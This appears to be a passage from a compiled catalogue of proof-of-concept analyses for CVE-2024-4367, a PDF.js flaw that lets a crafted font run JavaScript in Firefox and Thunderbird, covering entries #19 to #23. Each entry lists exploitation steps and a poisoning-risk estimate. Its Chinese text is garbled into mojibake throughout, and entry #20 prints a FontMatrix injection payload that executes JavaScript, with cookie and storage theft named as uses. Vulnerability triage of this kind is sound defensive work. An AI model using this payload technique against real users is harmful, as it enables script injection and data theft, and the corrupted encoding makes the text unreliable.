åˆ†æäº†æä¾›çš„POCä»£ç ï¼Œå‘ç°å…¶ä¸­ `/deploy/app.js` ä¸­å­˜åœ¨è·å– `/flag` æ¥å£çš„é€»è¾‘ï¼Œä½†åªæœ‰å½“è¯·æ±‚æ¥è‡ª `127.0.0.1` æ—¶æ‰ä¼šè¿”å› `SF{FAKE_FLAG}`ã€‚è€Œ `/deploy/flag.txt` æ–‡ä»¶ä¸­åŒ…å«çœŸæ­£çš„ flag `flag{pdf_js_pdf}`ï¼Œè¿™ä¸ªflagå¯èƒ½æ„å‘³ç€çœŸå®çš„åˆ©ç”¨ã€‚å¦‚æœä½œè€…çš„æœ¬æ„æ˜¯è¿·æƒ‘ä½¿ç”¨è€…ä½¿ç”¨å‡çš„flagï¼Œä¸”ä½¿ç”¨è€…ä¸ä»”ç»†åˆ†æä»£ç ï¼Œå¯èƒ½ä¼šè¢«è¯¯å¯¼ã€‚ä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„è¿·æƒ‘æ€§ï¼Œä½†ä¸»è¦ç›®çš„æ˜¯æµ‹è¯•ï¼ŒæŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**

1.  æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨ PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼ŒåµŒå…¥æ¶æ„çš„ JavaScript ä»£ç ã€‚
2.  æ”»å‡»è€…å°†æ­¤æ¶æ„ PDF æ–‡ä»¶å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
3.  ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶ã€‚
4.  ç”±äºæ¼æ´çš„å­˜åœ¨ï¼Œæ¶æ„ JavaScript ä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚è¿™ä¸ª JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå– Cookieã€é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€ç”šè‡³æ‰§è¡Œå…¶ä»–æ”»å‡»ã€‚

åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®åœ¨äºæ„é€ ä¸€ä¸ªèƒ½å¤Ÿç»•è¿‡ PDF.js ç±»å‹æ£€æŸ¥çš„æ¶æ„ PDF æ–‡ä»¶ï¼Œå¹¶åµŒå…¥èƒ½å¤Ÿæ‰§è¡Œæ”»å‡»è€…æ‰€éœ€æ“ä½œçš„ JavaScript ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [m0d0ri205/PDFJS](https://github.com/m0d0ri205/PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #19

**æ¥æº**: [CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md)

## CVE-2024-4367 PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS), ä¿¡æ¯æ³„éœ²ç­‰

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** å—å®³è€…éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­å­˜åœ¨çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œæ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefox, Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„JavaScriptä»£ç ä¼šè¢«æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å½±å“å¤šä¸ªMozillaäº§å“ï¼Œä¸”å­˜åœ¨å…¬å¼€å¯ç”¨çš„PoCä»£ç ã€‚PoCä»£ç é€šè¿‡`pdf-modify.py`è„šæœ¬ä¿®æ”¹PDFæ–‡ä»¶ï¼Œå°†æ¶æ„JavaScriptä»£ç æ³¨å…¥åˆ°PDFæ–‡ä»¶ä¸­ï¼Œæ›¿æ¢åŸå§‹æ–‡ä»¶ä¸­çš„å ä½ç¬¦ï¼Œå› æ­¤è¯¥PoCä»£ç çš„æœ‰æ•ˆæ€§è¾ƒé«˜ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æŸ¥çœ‹PoCä»£ç ï¼Œ`pdf-modify.py`è„šæœ¬çš„ä¸»è¦åŠŸèƒ½æ˜¯æ›¿æ¢PDFæ–‡ä»¶ä¸­çš„ç‰¹å®šå­—ç¬¦ä¸²ï¼ˆ`PLACEHOLDER`ï¼‰ä¸ºæ”»å‡»è€…æä¾›çš„æ¶æ„JavaScriptä»£ç ã€‚è„šæœ¬æœ¬èº«æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚å›è¿æ”»å‡»è€…æœåŠ¡å™¨ã€æ¤å…¥åé—¨ç­‰ã€‚`README.md` ä¹Ÿæä¾›äº†ä½¿ç”¨è¯´æ˜ï¼Œæ•´ä½“ä»£ç ç›¸å¯¹ç®€æ´æ˜“æ‡‚ã€‚

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹`payload_new`å˜é‡æ¥å®šä¹‰æ‰§è¡Œçš„JavaScriptä»£ç ã€‚å› æ­¤ï¼Œå¦‚æœç”¨æˆ·ä¸å°å¿ƒä½¿ç”¨äº†åŒ…å«æ¶æ„payloadçš„`payload_new`ï¼Œåˆ™ä¼šå¯¼è‡´æ”»å‡»ã€‚ä½†è¿™ç§é£é™©ä¸åœ¨äºPoCä»£ç æœ¬èº«è¢«æŠ•æ¯’ï¼Œè€Œåœ¨äºä½¿ç”¨è€…ä½¿ç”¨çš„payloadæ˜¯å¦å®‰å…¨ã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œè®¤ä¸ºè¯¥PoCä»£ç å­˜åœ¨è¾ƒä½çš„æŠ•æ¯’é£é™©ï¼ˆçº¦5%ï¼‰ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ¶ä½œæ¶æ„çš„PDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ç‰¹æ®Šçš„å ä½ç¬¦ï¼ˆ`PLACEHOLDER`ï¼‰ã€‚
2.  æ”»å‡»è€…ä½¿ç”¨`pdf-modify.py`è„šæœ¬ï¼Œå°†æ¶æ„JavaScriptä»£ç æ³¨å…¥åˆ°PDFæ–‡ä»¶ä¸­ï¼Œæ›¿æ¢å ä½ç¬¦ã€‚
3.  æ”»å‡»è€…å°†ä¿®æ”¹åçš„æ¶æ„PDFæ–‡ä»¶å‘é€ç»™å—å®³è€…ã€‚
4.  å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefox, Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
5.  PDF.jsè§£æPDFæ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œæ³¨å…¥çš„æ¶æ„JavaScriptä»£ç ï¼Œä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚

æ¶æ„ä»£ç å¯ä»¥æ‰§è¡Œçš„æ“ä½œåŒ…æ‹¬ï¼š

*   çªƒå–ç”¨æˆ·çš„Cookieã€localStorageã€sessionStorageç­‰æ•æ„Ÿä¿¡æ¯ã€‚
*   å°†ç”¨æˆ·é‡å®šå‘åˆ°é’“é±¼ç½‘ç«™ã€‚
*   åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [pS3ud0RAnD0m/CVE-2024-4367-POC](https://github.com/pS3ud0RAnD0m/CVE-2024-4367-POC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #20

**æ¥æº**: [CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md](../2024/CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefox, Firefox ESR, Thunderbirdä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå­˜åœ¨äºPDF.jsä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„PDFæ–‡æ¡£ã€‚
2.  è¯¥PDFæ–‡æ¡£åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨PDF.jså­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€æ­¤PDFæ–‡æ¡£æ—¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ¶æ„å­—ä½“æ•°æ®ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼ŒPDF.jsä¼šæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“æ•°æ®ä¸­çš„æ¶æ„JavaScriptä»£ç ã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¯ä»¥è¿›è¡Œè¯¸å¦‚çªƒå–ä¿¡æ¯æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚

**POCåˆ†æï¼š**

æä¾›çš„POCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«:
*   å®šä¹‰äº†ä¸€ä¸ªShading Patternï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªFunctionï¼Œè¯¥Functionç”¨äºç”Ÿæˆé¢œè‰²ï¼ŒåŒ…å«/C0[0 0 1]å’Œ/C1[1 0.6 0]ï¼Œå®šä¹‰äº†ä»è“åˆ°æ©™è‰²çš„é¢œè‰²æ¸å˜
*   å®šä¹‰äº†ä¸€ä¸ªFontï¼Œå…¶ä¸­FontMatrixçš„å€¼ä¸º`[0.1 0 0 0.1 0 (1\); alert\('vprr')]`ï¼Œå…¶ä¸­åŒ…å«äº†åµŒå…¥çš„JavaScriptä»£ç `alert('vprr')`
*   å®šä¹‰äº†ä¸€ä¸ªPageï¼ŒContents ä½¿ç”¨äº†å®šä¹‰çš„ Shading Pattern å’Œ Fontï¼Œé€šè¿‡åœ¨PDFæ–‡æ¡£ä¸­ç»˜åˆ¶æ–‡æœ¬ï¼Œä¼šè§¦å‘å­—ä½“æ¸²æŸ“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“ä¸­çš„JavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œè¯¥POCåˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ï¼Œé€šè¿‡åœ¨FontMatrixä¸­åµŒå…¥JavaScriptä»£ç ï¼ŒæˆåŠŸå®ç°äº†ä»»æ„JavaScriptä»£ç æ‰§è¡Œã€‚å› æ­¤ï¼Œè¯¥POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡ŒJavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚è™½ç„¶POCæœ¬èº«ä¸åŒ…å«æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½†å¦‚æœæ”»å‡»è€…åœ¨å®é™…æ”»å‡»ä¸­ï¼Œå¯èƒ½ä¼šå°†è­¦å‘Šæ¡†æ›¿æ¢ä¸ºæ›´éšè”½çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚å› æ­¤åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚ ä¸»è¦æ˜¯è€ƒè™‘äº†ä½œè€…å¯èƒ½å°†alertä¿¡æ¯æ›¿æ¢ä¸ºå…¶ä»–payloadã€‚ä½†å°±ç›®å‰æ¥çœ‹ï¼Œè¯¥PDF ä»…ä»…æ˜¯æ¼æ´éªŒè¯ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [pedrochalegre7/CVE-2024-4367-pdf-sample](https://github.com/pedrochalegre7/CVE-2024-4367-pdf-sample)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #21

**æ¥æº**: [CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md)

## CVE-2024-4367 PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼Œæˆ–åœ¨ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ã€‚è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ï¼Œåœ¨ FontMatrix ä¸­æ’å…¥æ¶æ„ JavaScript ä»£ç ã€‚
2.  å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR, æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  åˆ©ç”¨ä»£ç  `poc.py` å¯ä»¥è‡ªåŠ¨åŒ–ç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç ç›´æ¥ç”ŸæˆåŒ…å«åµŒå…¥çš„ JavaScript ä»£ç çš„ PDFï¼Œå¹¶åˆ©ç”¨æ¼æ´æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**

åˆ†ææä¾›çš„ `poc.py` å’Œ `malicious.pdf` æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`poc.py` çš„ä½œç”¨æ˜¯ç”ŸæˆåŒ…å«æŒ‡å®š JavaScript payload çš„ PDF æ–‡ä»¶ï¼Œè€Œ `malicious.pdf` æ˜¯ä¸€ä¸ªå·²ç»ç”Ÿæˆå¥½çš„ç¤ºä¾‹ PDFã€‚ ä»“åº“çš„README.mdä¹Ÿæè¿°äº†å¦‚æœä½¿ç”¨pythonè„šæœ¬ç”ŸæˆPDFã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [s4vvysec/CVE-2024-4367-POC](https://github.com/s4vvysec/CVE-2024-4367-POC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #22

**æ¥æº**: [CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md)

## CVE-2024-4367 - Mozilla Firefox, Firefox ESR, Thunderbird PDF.js JavaScript Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScript ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Mozilla Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„ PDF æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´æ˜¯ Mozilla Firefox, Firefox ESR, Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨æˆ– Thunderbird æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ¥çœ‹ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæœ¬åœ°çš„å¼€å‘ç¯å¢ƒæ¥éªŒè¯å’Œæµ‹è¯•åˆ©ç”¨æ­¤æ¼æ´çš„ PDF æ–‡ä»¶ã€‚ è¯¥ POC ä»£ç åŒ…å«ä¸€ä¸ªç”¨äºæ¼”ç¤ºæ¼æ´åˆ©ç”¨çš„ Web æœåŠ¡å™¨ï¼Œå¹¶æä¾›ä¸åŒå‰ç«¯æ¡†æ¶ï¼ˆReact, Vue, Svelteï¼‰çš„ç»„ä»¶ã€‚é€šè¿‡ä¿®æ”¹ç»„ä»¶æŒ‡å‘çš„ PDF æ–‡ä»¶ï¼Œå¯ä»¥æµ‹è¯•ä¸åŒçš„æ”»å‡»è½½è·ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼ˆç‰¹åˆ«æ˜¯ GitHub ä¸Šçš„ POC ä»“åº“ï¼‰ï¼Œè¯¥æ¼æ´è¢«ç¡®è®¤å­˜åœ¨ä¸”æœ‰å¯ç”¨çš„ POC ä»£ç ã€‚ POC ä»£ç æä¾›äº†ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œå¯ä»¥ç”¨æ¥éªŒè¯æ¼æ´åˆ©ç”¨ã€‚ å› æ­¤ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**

åˆ†ææä¾›çš„ä»£ç ä»“åº“ï¼Œå‘ç°è¯¥ä»“åº“ä¸»è¦æ˜¯ä¸ºäº†æ¼”ç¤ºå’ŒéªŒè¯ CVE-2024-4367 æ¼æ´ï¼Œæœ¬èº«æä¾›äº† react, vue, svelte ä¸‰ç§æ¡†æ¶æ¥æ¼”ç¤ºæ¼æ´ï¼Œä»£ç æœ¬èº«ç›¸å¯¹æ¸…æ™°ã€‚ å­˜åœ¨çš„é£é™©æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç æ‰§è¡Œï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æµ‹è¯• PDF æ–‡ä»¶æˆ–è€…å‰ç«¯ä»£ç ï¼ˆè™½ç„¶ä¸å¤ªå®¹æ˜“ï¼‰æ¥å¼•å…¥æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°æŠ•æ¯’æ”»å‡»ã€‚ å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†ä¸»è¦é›†ä¸­åœ¨ä½¿ç”¨è¯¥ POC ä»£ç æ—¶ï¼Œç”¨æˆ·éœ€è¦æ£€æŸ¥å’ŒéªŒè¯æ‰€ä½¿ç”¨çš„ PDF æ–‡ä»¶å’Œå‰ç«¯ä»£ç çš„å®‰å…¨æ€§ã€‚ ä»£ç æ¡†æ¶è¾ƒä¸ºè§„èŒƒï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½œè€…å¯èƒ½åªæ˜¯æƒ³æ¼”ç¤ºæ¼æ´ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ¶æ„æ´»åŠ¨ã€‚ è€ƒè™‘åˆ°è¿™äº›å› ç´ ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æ:**

1.  **æ¼æ´æ ¹æºï¼š** PDF.js åœ¨å¤„ç† PDF æ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ–¹å¼ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
3.  **æ”»å‡»è¿‡ç¨‹ï¼š**
    *   ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ¶æ„ PDF æ–‡ä»¶ã€‚
    *   PDF.js è§£æè¯¥ PDF æ–‡ä»¶ã€‚
    *   ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­è¢«æ‰§è¡Œã€‚
4.  **æ”»å‡»ç»“æœï¼š** æ¶æ„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–æ•æ„Ÿä¿¡æ¯ã€æ‰§è¡Œä»»æ„ä»£ç ç­‰ã€‚ ç”±äº PDF.js è¿è¡Œåœ¨æµè§ˆå™¨çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ”»å‡»è€…é€šå¸¸æ— æ³•ç›´æ¥è®¿é—®æ“ä½œç³»ç»Ÿçš„åº•å±‚èµ„æºã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–ä»¬å¯èƒ½é€šè¿‡å…¶ä»–æ¼æ´æˆ–åˆ©ç”¨æµè§ˆå™¨çš„åŠŸèƒ½æ¥æå‡æƒé™ã€‚

**é¡¹ç›®åœ°å€:** [snyk-labs/pdfjs-vuln-demo](https://github.com/snyk-labs/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #23

**æ¥æº**: [CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md](../2024/CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è·¨ç«™è„šæœ¬æ”»å‡»

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å­—ä½“å¤„ç†æ—¶çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

